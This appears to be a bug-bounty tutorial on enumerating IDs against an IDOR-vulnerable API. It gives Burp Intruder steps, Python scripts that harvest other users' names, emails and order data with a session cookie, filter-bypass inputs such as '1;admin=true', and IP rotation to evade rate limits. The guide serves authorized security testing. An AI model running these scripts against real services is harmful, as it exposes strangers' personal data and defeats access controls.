## **Phase 3: ID Enumeration - Complete Guide**

### **What Is ID Enumeration?**

Once you've found that an endpoint is vulnerable (like `/api/profile/222` returns data when accessed as User A), you want to **extract as much data as possible** by trying many different IDs.

**Example:**

```
You found: /api/profile/222 returns User B's data

Now enumerate:
/api/profile/1 → User 1's data
/api/profile/2 → User 2's data
/api/profile/3 → User 3's data
... all the way to /api/profile/10000
```

---

## **Step 1: Identify Your Vulnerable Endpoint**

From Phase 2, you should have found at least one endpoint that's vulnerable.

**Example findings:**

```
Vulnerable endpoint: /api/user/profile
Vulnerable endpoint: /api/invoices
Vulnerable endpoint: /api/account-settings
```

Pick **one endpoint** to enumerate. Start with the most sensitive one.

---

## **Step 2: Understand the ID Format**

Before you enumerate, you need to know: **What format are the IDs?**

From Phase 1, you already documented this. Check your spreadsheet:

|ID Format|Example|How to Enumerate|
|---|---|---|
|**Sequential Numeric**|1, 2, 3, 100, 200|Try 1-1000|
|**Numeric with Prefix**|user_1, user_2|Try user_1 to user_1000|
|**UUID**|550e8400-e29b-41d4-a716-446655440000|Can't enumerate (random)|
|**Email-based**|user@gmail.com|Need a list of emails|
|**Predictable pattern**|2024001, 2024002|Follow the pattern|

---

## **Step 3: Manual Testing (10-20 IDs)**

**Before you automate, test manually first.**

### **Why?**

- Confirm the pattern actually works
- Check if there are rate limits
- See what valid vs. invalid IDs return

### **Test in Burp Repeater:**

**Endpoint:** `/api/user/profile`  
**Vulnerable:** Already confirmed (User A can access User B's ID)

```
Logged in as User A

Test manually:
GET /api/user/profile/1    → Response?
GET /api/user/profile/2    → Response?
GET /api/user/profile/3    → Response?
GET /api/user/profile/10   → Response?
GET /api/user/profile/100  → Response?
GET /api/user/profile/1000 → Response?
```

### **What To Look For:**

**Valid ID (User exists):**

```
HTTP/1.1 200 OK

{
  "id": 5,
  "name": "John Doe",
  "email": "john@gmail.com"
}
```

**Invalid ID (User doesn't exist):**

```
HTTP/1.1 404 Not Found

{
  "error": "User not found"
}
```

**Blocked (Rate limit):**

```
HTTP/1.1 429 Too Many Requests

{
  "error": "Rate limit exceeded. Try again later."
}
```

### **Document Your Findings:**

|ID|Status|Response|Valid?|
|---|---|---|---|
|1|200|User data|YES|
|2|200|User data|YES|
|3|200|User data|YES|
|4|404|Not found|NO|
|5|200|User data|YES|
|100|404|Not found|NO|
|1000|404|Not found|NO|

---

## **Step 4: Check for Rate Limiting**

**Important:** Send 10-20 requests manually. If you get a 429 response, **STOP.**

```
429 Too Many Requests = Rate limiting is active
```

**If rate-limited:**

- Add delays between requests (e.g., 1 second between each)
- Use a proxy to rotate IPs (if allowed by the bug bounty program)
- Or enumerate manually with smaller batches

**If NOT rate-limited:**

- You can automate (proceed to Step 5)

---

## **Step 5: Decide: Manual or Automated**

### **Option A: Manual Enumeration (Safer, if rate-limited)**

Use Burp's **Intruder** tool to test multiple IDs with delays.

### **In Burp Intruder:**

1. Right-click your request → **Send to Intruder**
2. Go to **Intruder tab**
3. Click **Positions** → Select the ID number → Click **Add §**

```
Original:
GET /api/user/profile/222

After marking:
GET /api/user/profile/§222§
```

4. Click **Payloads** tab
    
5. Under "Payload type", select **Numbers**
    
6. Set:
    
    - From: 1
    - To: 1000
    - Step: 1
7. Under **Resource pool**, set **Throttle** to 1 request per second (to avoid rate limiting)
    
8. Click **Start attack**
    

Burp will test: `/api/user/profile/1`, `/api/user/profile/2`, `/api/user/profile/3` ... `/api/user/profile/1000`

---

### **Option B: Automated Enumeration (Faster, if NO rate limiting)**

Write a simple Python script:

```python
import requests
import json

# Your auth cookie/token
headers = {
    'Cookie': 'session=YOUR_SESSION_COOKIE_HERE',
    'User-Agent': 'Mozilla/5.0'
}

# Target endpoint
base_url = 'https://target.com/api/user/profile'

# Results
results = []

# Test IDs 1 to 100
for user_id in range(1, 101):
    url = f'{base_url}/{user_id}'
    
    try:
        response = requests.get(url, headers=headers, timeout=5)
        
        if response.status_code == 200:
            try:
                data = response.json()
                results.append({
                    'id': user_id,
                    'status': 200,
                    'name': data.get('name', 'N/A'),
                    'email': data.get('email', 'N/A')
                })
                print(f'[+] Found: ID {user_id} - {data.get("name", "N/A")}')
            except:
                pass
        
        elif response.status_code == 404:
            print(f'[-] Not found: ID {user_id}')
        
        elif response.status_code == 429:
            print(f'[!] Rate limited! Stopping.')
            break
    
    except Exception as e:
        print(f'[!] Error on ID {user_id}: {e}')

# Save results
with open('enumeration_results.json', 'w') as f:
    json.dump(results, f, indent=2)

print(f'\n[*] Found {len(results)} valid users')
```

**How to use:**

1. Replace `YOUR_SESSION_COOKIE_HERE` with your actual cookie from Burp
2. Replace `https://target.com/api/user/profile` with your vulnerable endpoint
3. Run: `python3 enum.py`
4. Results saved in `enumeration_results.json`

---

## **Step 6: Analyze Your Results**

After enumeration, you'll have a list of valid IDs and their data:

```
ID 1: John Doe (john@gmail.com)
ID 2: Jane Smith (jane@gmail.com)
ID 3: Bob Johnson (bob@gmail.com)
ID 5: Alice Brown (alice@gmail.com)
ID 7: Charlie Davis (charlie@gmail.com)
...
```

**Document this:**

```
Vulnerable Endpoint: /api/user/profile
Total Valid IDs Found: 47
Sample Data Extracted:
- ID 1: john@gmail.com
- ID 2: jane@gmail.com
- ID 3: bob@gmail.com
- ID 5: alice@gmail.com
```

---

## **Step 7: Try Different ID Ranges**

If sequential numeric IDs work, also try:

```
Very large numbers:
/api/user/profile/999999
/api/user/profile/1000000

Negative numbers:
/api/user/profile/-1
/api/user/profile/-100

Zero:
/api/user/profile/0

Special characters:
/api/user/profile/1%00
/api/user/profile/1;admin=true
```

Sometimes these bypass filters.

---

## **Real Example: Complete Phase 3**

### **Target:** fakeecommerce.com

### **From Phase 2, you found:**

```
Vulnerable endpoint: /api/orders/[ORDER_ID]
User A (ID: 111) can access User B's (ID: 222) orders
Status: 200 OK, returns full order details
```

### **Step 1: Identify endpoint**

```
/api/orders/456
```

### **Step 2: Check ID format**

From your notes: Sequential numeric IDs (456, 789, etc.)

### **Step 3: Manual testing (in Burp Repeater)**

```
Logged in as User A

GET /api/orders/1     → 200 OK (returns order)
GET /api/orders/2     → 200 OK (returns order)
GET /api/orders/3     → 404 Not found
GET /api/orders/10    → 200 OK (returns order)
GET /api/orders/100   → 200 OK (returns order)
GET /api/orders/1000  → 404 Not found
```

**Result:** IDs 1, 2, 10, 100 are valid. No obvious range. Pattern: sequential but with gaps.

### **Step 4: Check rate limiting**

Sent 20 requests in 1 minute. No 429 response. **Not rate-limited.**

### **Step 5: Automate (Python script)**

Run enumeration script from 1-500:

```python
import requests

headers = {'Cookie': 'session=YOUR_COOKIE'}
base_url = 'https://fakeecommerce.com/api/orders'

for order_id in range(1, 501):
    response = requests.get(f'{base_url}/{order_id}', headers=headers)
    if response.status_code == 200:
        data = response.json()
        print(f'Order {order_id}: ${data.get("total")} - {data.get("user_email")}')
```

### **Step 6: Results**

```
Order 1: $50 - user1@gmail.com
Order 2: $150 - user2@gmail.com
Order 10: $300 - user10@gmail.com
Order 23: $500 - user23@gmail.com
Order 45: $200 - user45@gmail.com
Order 67: $1200 - user67@gmail.com
Order 89: $450 - user89@gmail.com

[*] Found 47 orders from different users
```

### **Step 7: Document findings**

```
IDOR Vulnerability in Order System

Endpoint: /api/orders/[ORDER_ID]
Method: GET
Vulnerable?: YES

Details:
- Any authenticated user can view ANY order
- Orders contain: Order ID, Total amount, User email, Shipping address
- Enumeration found 47 orders from different users
- ID range: 1-100+ (sequential)

Sample extracted data:
user1@gmail.com: Order 1 ($50)
user2@gmail.com: Order 2 ($150)
user10@gmail.com: Order 10 ($300)
... (47 orders total)
```

---

## **Step 8: What NOT To Do**

❌ **Don't enumerate without confirming vulnerability first**

- Phase 2 must show it's vulnerable before Phase 3

❌ **Don't ignore rate limits**

- If you get 429, add delays or STOP
- Continuing can get your account banned

❌ **Don't enumerate everything**

- Just 50-100 IDs is usually enough to prove the pattern
- You don't need to extract 1 million records

❌ **Don't miss the actual vulnerability in your report**

- Focus on WHAT'S VULNERABLE, not just how much data you extracted

---

## **Your Enumeration Checklist**

- [ ] Identified vulnerable endpoint from Phase 2
- [ ] Confirmed ID format (numeric, UUID, etc.)
- [ ] Manually tested 10-20 IDs in Burp Repeater
- [ ] Checked for rate limiting
- [ ] Decided: Manual (Intruder) or Automated (Python script)
- [ ] Ran enumeration on 50-100 IDs
- [ ] Documented results (which IDs were valid, what data was extracted)
- [ ] Identified the pattern (all sequential? gaps? etc.)

---

## **Next Steps**

Once you've completed Phase 3:

1. **Document your vulnerability clearly** (we'll do this next)
2. **Prepare your bug report** with proof
3. **Submit to the bug bounty program**

